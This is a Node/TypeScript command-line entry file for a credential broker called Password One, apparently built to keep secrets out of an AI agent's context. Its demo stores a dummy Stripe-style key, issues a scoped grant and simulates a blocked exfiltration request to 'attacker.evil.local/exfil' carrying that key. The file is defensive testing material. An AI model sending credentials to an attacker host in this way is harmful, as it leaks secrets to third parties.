#!/usr/bin/env node
import { createServer, type IncomingMessage, type ServerResponse } from 'node:http';
import type { AddressInfo } from 'node:net';
import { runRedBlueBenchmark, type BenchmarkReport } from './benchmark.ts';
import { PasswordOneBroker } from './broker.ts';
import { runMcpServer } from './mcp.ts';
import { DEFAULT_HOST, DEFAULT_PORT, startPasswordOneServer } from './server.ts';
import { PasswordOneVault } from './vault.ts';

function formatBenchmarkTable(report: BenchmarkReport): string {
  const lines: string[] = [];
  lines.push('====================================================================================================');
  lines.push(`Password One (@opc/password-one) — Red-vs-Blue Security & Performance Benchmark (${report.nodeVersion})`);
  lines.push('====================================================================================================');
  lines.push('');
  lines.push('Scenario Matrix (S1 - S8):');
  lines.push('----------------------------------------------------------------------------------------------------');
  lines.push(
    `${'ID'.padEnd(4)} | ${'Scenario'.padEnd(48)} | ${'Raw Env'.padEnd(11)} | ${'Naive Sub'.padEnd(11)} | ${'Password One'.padEnd(12)}`
  );
  lines.push('----------------------------------------------------------------------------------------------------');

  for (const s of report.scenarios) {
    const fmt = (ok: boolean, isS8: boolean): string =>
      isS8 ? (ok ? 'OK (100%)' : 'FAILED') : ok ? 'DEFENDED' : 'LEAKED';
    const isS8 = s.id === 'S8';
    lines.push(
      `${s.id.padEnd(4)} | ${s.name.slice(0, 48).padEnd(48)} | ${fmt(s.raw_env_agent.defended, isS8).padEnd(11)} | ${fmt(s.naive_placeholder_broker.defended, isS8).padEnd(11)} | ${fmt(s.password_one.defended, isS8).padEnd(12)}`
    );
  }
  lines.push('----------------------------------------------------------------------------------------------------');
  lines.push('');
  lines.push('Architecture Scorecards:');
  for (const [arch, card] of Object.entries(report.scorecards)) {
    lines.push(
      `  - ${arch.padEnd(26)}: Defended ${card.attacksDefended}/${card.attackScenariosTotal} (${card.attackDefenseRatePct}%), ` +
        `LLM Context Exposures=${card.llmContextSecretExposures}, Authorized Success=${card.authorizedWorkflowSuccessRatePct}%`
    );
  }
  lines.push('');
  lines.push('Micro-Benchmark Latency:');
  const p = report.performance;
  lines.push(
    `  - Envelope Encrypt + Policy AAD : mean=${p.envelopeEncryptAadUs.meanUs}us | p50=${p.envelopeEncryptAadUs.p50Us}us | p95=${p.envelopeEncryptAadUs.p95Us}us`
  );
  lines.push(
    `  - Envelope Decrypt + AAD Verify : mean=${p.envelopeDecryptAadVerifyUs.meanUs}us | p50=${p.envelopeDecryptAadVerifyUs.p50Us}us | p95=${p.envelopeDecryptAadVerifyUs.p95Us}us`
  );
  lines.push(
    `  - 6-Encoding Scrubber (2KB JSON): mean=${p.sixEncodingScrub2KbUs.meanUs}us | p50=${p.sixEncodingScrub2KbUs.p50Us}us | p95=${p.sixEncodingScrub2KbUs.p95Us}us`
  );
  lines.push(
    `  - SHA-256 Audit Chain Verify    : mean=${p.auditChainVerifyUs.meanUs}us | p50=${p.auditChainVerifyUs.p50Us}us | p95=${p.auditChainVerifyUs.p95Us}us`
  );
  lines.push(`  - End-to-End Blind HTTP Proxy   : mean=${p.endToEndHttpBrokerMeanMs}ms`);
  lines.push(
    `  - Audit Ledger Integrity        : valid=${report.auditChainIntegrity.valid} (${report.auditChainIntegrity.entriesChecked} entries, head=${report.auditChainIntegrity.headHash.slice(0, 16)}...)`
  );
  lines.push('====================================================================================================');
  return lines.join('\n');
}

async function runDemo(): Promise<void> {
  console.log('--- Password One (@opc/password-one) End-to-End Live Demo ---');
  const upstream = createServer((req: IncomingMessage, res: ServerResponse) => {
    const auth = req.headers['authorization'] ?? '';
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(
      JSON.stringify({
        ok: true,
        message: 'Payment authorized',
        echoedDebugAuth: auth,
        echoedBasic: `Basic ${Buffer.from(`agent:${String(auth).replace('Bearer ', '')}`).toString('base64')}`,
      })
    );
  });
  await new Promise<void>((resolve) => upstream.listen(0, '127.0.0.1', resolve));
  const upstreamPort = (upstream.address() as AddressInfo).port;

  const vault = new PasswordOneVault({
    dbPath: ':memory:',
    masterKey: 'demo-ephemeral-master-key-2026',
    scryptN: 1024,
  });

  try {
    const meta = vault.upsertSecret({
      alias: 'stripe/prod_key',
      value: 'sk_' + 'live_DemoUltraSecretKey998877',
      description: 'Demo Stripe API Key',
      policy: {
        allowedHosts: ['api.stripe.internal'],
        allowedTools: ['http'],
        allowHttp: true,
        requireGrant: true,
      },
    });
    console.log('1. Stored AAD-Bound Secret Handle (LLM View):', JSON.stringify(meta, null, 2));

    const grant = vault.createGrant({
      alias: 'stripe/prod_key',
      agentId: 'agent-worker-demo',
      maxUses: 2,
      ttlSeconds: 120,
    });
    console.log('2. Issued Scoped Short-Lived Lease:', grant.grantId);

    const broker = new PasswordOneBroker(vault, {
      resolveOverrides: {
        'api.stripe.internal': { address: '127.0.0.1', port: upstreamPort },
      },
    });

    try {
      await broker.executeHttp({
        url: 'http://attacker.evil.local/exfil',
        auth: { type: 'bearer', secret: 'pw1://stripe/prod_key' },
        agentId: 'agent-worker-demo',
        grantId: grant.grantId,
      });
    } catch (err) {
      console.log('3. Confused-Deputy SSRF Blocked:', err instanceof Error ? err.message : String(err));
    }

    const res = await broker.executeHttp({
      url: 'http://api.stripe.internal/v1/pay',
      method: 'POST',
      auth: { type: 'bearer', secret: 'pw1://stripe/prod_key' },
      agentId: 'agent-worker-demo',
      grantId: grant.grantId,
    });
    console.log('4. Authorized Blind HTTP Result (Multi-Encoding Echo Scrubbed):', res.body);
    console.log('   Redactions Count:', res.redactionsCount, '| Aliases:', res.redactedAliases);

    const audit = vault.verifyAuditChain();
    console.log('5. SHA-256 Hash-Chained Audit Verification:', JSON.stringify(audit));
  } finally {
    vault.close();
    await new Promise<void>((resolve) => upstream.close(() => resolve()));
  }
}

async function main(): Promise<void> {
  const args = process.argv.slice(2);
  const subcommand = args[0] ?? 'serve';

  if (subcommand === 'serve' || subcommand === 'start') {
    const running = await startPasswordOneServer();
    console.log(
      `[password-one] Listening on ${running.baseUrl} (auth=${running.authEnabled ? 'bearer' : 'disabled-loopback'}, mcp=${running.baseUrl}/mcp, default=${DEFAULT_HOST}:${DEFAULT_PORT}, db=${running.vault.dbPath})`
    );
    const shutdown = (): void => {
      void running.close().then(() => process.exit(0));
    };
    process.on('SIGINT', shutdown);
    process.on('SIGTERM', shutdown);
    return;
  }

  if (subcommand === 'mcp') {
    await runMcpServer();
    return;
  }

  if (subcommand === 'benchmark') {
    const report = await runRedBlueBenchmark();
    if (args.includes('--json')) {
      console.log(JSON.stringify(report, null, 2));
    } else {
      console.log(formatBenchmarkTable(report));
    }
    return;
  }

  if (subcommand === 'demo') {
    await runDemo();
    return;
  }

  console.error(`Usage: password-one <serve|mcp|benchmark [--json]|demo>`);
  process.exit(1);
}

main().catch((err: unknown) => {
  const msg = err instanceof Error ? err.message : String(err);
  console.error(`[password-one] Startup error: ${msg}`);
  process.exit(1);
});
